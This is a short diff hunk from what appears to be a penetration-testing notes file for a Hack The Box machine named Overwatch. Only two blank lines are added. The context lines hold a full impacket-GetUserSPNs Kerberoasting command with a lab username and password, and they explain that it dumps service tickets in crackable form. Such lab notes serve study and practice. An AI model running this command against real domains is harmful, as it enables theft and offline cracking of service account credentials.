@@ -39,3 +39,5 @@ impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -req
 Used on: **Overwatch**
 
 - `-request` — request TGS tickets and dump them in crackable format (mode 13100)
+
+
